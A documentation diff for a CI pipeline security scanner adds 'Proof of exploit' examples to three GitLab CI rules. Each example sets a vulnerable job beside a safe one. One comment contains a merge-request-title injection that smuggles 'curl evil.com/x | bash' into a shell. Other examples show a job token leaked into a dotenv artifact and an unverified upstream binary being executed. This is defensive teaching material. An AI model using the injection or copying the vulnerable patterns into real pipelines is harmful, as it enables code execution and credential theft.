@@ -5754,6 +5754,31 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Recommendation.** Read these values into intermediate `variables:` entries or shell variables and quote them defensively (`"$BRANCH"`). Never inline `$CI_COMMIT_MESSAGE` / `$CI_MERGE_REQUEST_TITLE` into a shell command.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an MR titled ``feat: shiny new thing";
+# curl evil.com/x | bash;"`` executes the curl in the
+# build's shell context. The MR author needs no special
+# privilege — any branch contributor can open one.
+build:
+  script:
+    - echo "Building MR $CI_MERGE_REQUEST_TITLE"
+    - ./build.sh
+
+# Safe: pass the untrusted value through an env var and
+# quote it. The shell sees the value as one argument; the
+# attacker's injected ``;`` / ``$()`` / backticks are
+# literal characters in the printed string, not parsed
+# tokens.
+build:
+  script:
+    - echo "Building MR $MR_TITLE"
+    - ./build.sh
+  variables:
+    MR_TITLE: $CI_MERGE_REQUEST_TITLE
+```
+
 **Source:** [`GL-002`](../providers/gitlab.md#gl-002) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-003 }
@@ -5839,6 +5864,45 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **How this is detected.** `needs: { project: ..., artifacts: true }` pulls artifacts from another project's pipeline. If that upstream project accepts MR pipelines, the artifact may have been built by attacker-controlled code.
 
 **Recommendation.** Add a verification step before consuming the artifact: `cosign verify-attestation`, `sha256sum -c`, or `gpg --verify` against a manifest signed by the upstream project's release key. Only consume artifacts produced by upstream pipelines whose origin you can trust.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every run of ``deploy`` downloads the binary
+# from ``vendor-team/build``'s latest pipeline and executes
+# it. If that upstream project accepts MR pipelines, an MR
+# author can push a malicious binary as ``build-output``
+# and have it run inside ``deploy`` with the deploy job's
+# credentials.
+deploy:
+  stage: deploy
+  needs:
+    - project: vendor-team/build
+      job: package
+      ref: main
+      artifacts: true
+  script:
+    - ./build-output/release    # runs the upstream binary
+
+# Safe: verify a signed manifest (cosign / GPG / SHA-256
+# from a trusted publisher) before executing anything from
+# the downloaded directory. The verify step must come BEFORE
+# any step that reads the artifact.
+deploy:
+  stage: deploy
+  needs:
+    - project: vendor-team/build
+      job: package
+      ref: main
+      artifacts: true
+  script:
+    - cosign verify-attestation
+        --type slsaprovenance
+        --certificate-identity-regexp 'https://gitlab.com/vendor-team/build/'
+        --certificate-oidc-issuer 'https://gitlab.com'
+        ./build-output/release
+    - ./build-output/release
+```
 
 **Source:** [`GL-010`](../providers/gitlab.md#gl-010) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -5933,6 +5997,32 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **Recommendation.** Never write CI_JOB_TOKEN to files, artifacts, or dotenv reports. Use the token inline in the command that needs it and let GitLab revoke it automatically when the job finishes.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``CI_JOB_TOKEN`` is meant to live only for the
+# duration of the current job — GitLab revokes it when the
+# job ends. Persisting it into a file (especially a dotenv
+# report that GitLab automatically loads into the next job)
+# or an artifact downloadable from the pipeline page extends
+# the credential's reach far beyond its intended scope.
+leak-token:
+  script:
+    - echo "TOKEN=$CI_JOB_TOKEN" >> deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env    # propagates TOKEN into every dependent job
+
+# Safe: use the token inline in the one command that needs
+# it. GitLab scopes the token to the job's lifetime and
+# revokes it on exit; nothing downstream can replay it.
+package:
+  script:
+    - curl --header "JOB-TOKEN: $CI_JOB_TOKEN"
+        --upload-file build/output.tar.gz
+        "$CI_API_V4_URL/projects/$CI_PROJECT_ID/packages/generic/app/1.0/output.tar.gz"
+```
 
 **Source:** [`GL-020`](../providers/gitlab.md#gl-020) in the [GitLab CI provider](../providers/gitlab.md).
 
